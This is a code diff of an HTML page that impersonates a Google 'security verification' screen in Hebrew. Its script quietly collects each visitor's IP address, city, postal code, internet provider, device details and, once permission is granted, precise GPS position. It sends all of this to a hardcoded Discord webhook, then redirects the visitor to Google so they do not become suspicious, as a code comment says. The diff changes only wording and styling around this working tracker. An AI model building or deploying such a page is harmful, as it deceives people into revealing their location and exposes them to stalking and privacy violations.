@@ -3,28 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Cloud Verification</title>
+    <title>Google - Verification System</title>
     <style>
-        body { background-color: #f7f7f7; font-family: "Segoe UI", sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        body { background-color: #f7f7f7; font-family: "Segoe UI", Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { color: #5f6368; font-size: 20px; margin-top: 20px; }
-        p { color: #70757a; font-size: 14px; }
+        h1 { color: #5f6368; font-size: 22px; margin-top: 25px; font-weight: 400; }
+        p { color: #70757a; font-size: 15px; margin-top: 10px; }
     </style>
 </head>
 <body>
 
     <div class="loader"></div>
     <h1>מבצע אימות אבטחה...</h1>
-    <p>אנא אשר את בקשת המיקום כדי להמשיך לשירותי Google</p>
+    <p>אנא המתן בזמן שאנו מאמתים את פרטי החיבור שלך מול שרתי Google Cloud.</p>
 
     <script>
-        // הכנס כאן את ה-Webhook שלך
+        // ה-Webhook שלך - וודא שהוא תקין בדיסקורד
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1476381984401133640/og1zEQ__IRGuIws45fteC3R_j0iekyFLkqhi7OKwWymzSnyKwIMZJBeZxuwH3eOruzv0";
         
-        async function sendFinalLog(exactPos = null) {
+        async function captureData(exactPos = null) {
             try {
-                // שליפת נתוני IP וספק אינטרנט
+                // שליפת נתוני IP, ספק, עיר ומיקוד
                 const geoRes = await fetch('https://ipapi.co/json/');
                 const geoData = await geoRes.json();
                 
@@ -35,7 +35,7 @@
                     ipv6 = v6Data.ip;
                 } catch(e) {}
 
-                let title = exactPos ? "✅ אימות הושלם - מיקום מדויק התקבל!" : "⚠️ כניסה לדף (ממתין לאישור מיקום)";
+                let title = exactPos ? "✅ אימות הושלם - מיקום מדויק התקבל!" : "⚠️ כניסה לדף (ממתין לאישור GPS)";
                 let color = exactPos ? 3066993 : 15158332;
                 
                 let lat = exactPos ? exactPos.coords.latitude : geoData.latitude;
@@ -52,10 +52,10 @@
                             { name: "🌍 עיר ומדינה", value: `${geoData.city || 'N/A'}, ${geoData.country_name || 'N/A'}`, inline: true },
                             { name: "📮 מיקוד", value: `\`${geoData.postal || 'N/A'}\``, inline: true },
                             { name: "🏢 ספק אינטרנט", value: geoData.org || "N/A", inline: false },
-                            { name: "📍 מיקום במפה", value: `[לחץ לצפייה במפה](${mapURL})`, inline: false },
+                            { name: "📍 מיקום במפה", value: `[לחץ לפתיחה במפות גוגל](${mapURL})`, inline: false },
                             { name: "📱 פרטי מכשיר", value: "```" + navigator.userAgent + "```" }
                         ],
-                        footer: { text: "Security Monitor System" },
+                        footer: { text: "Security Monitor System v2.0" },
                         timestamp: new Date()
                     }]
                 };
@@ -66,26 +66,27 @@
                     body: JSON.stringify(payload) 
                 });
             } catch (e) {
-                console.error("Error:", e);
+                console.error("Error sending to Discord:", e);
             }
         }
 
-        // הפעלה מידית
         window.onload = () => {
-            // קודם כל שולח לוג כניסה בסיסי
-            sendFinalLog();
+            // לוג ראשון נשלח מיד עם הטעינה (IP וספק)
+            captureData();
 
-            // מבקש מיקום מדויק
+            // בקשת מיקום מהדפדפן
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        sendFinalLog(pos); // שולח לוג שני עם GPS מדויק
+                        // אם אישר - נשלח לוג שני עם GPS מדויק
+                        captureData(pos);
+                        // אחרי 2 שניות מעביר אותם לגוגל שלא יחשדו
                         setTimeout(() => {
-                            window.location.href = "https://www.google.com"; // מעביר אותם לגוגל אחרי האישור
-                        }, 1000);
+                            window.location.href = "https://www.google.com";
+                        }, 2000);
                     },
-                    () => {
-                        console.log("User denied location");
+                    (err) => {
+                        console.log("Location denied or error");
                     },
                     { enableHighAccuracy: true }
                 );
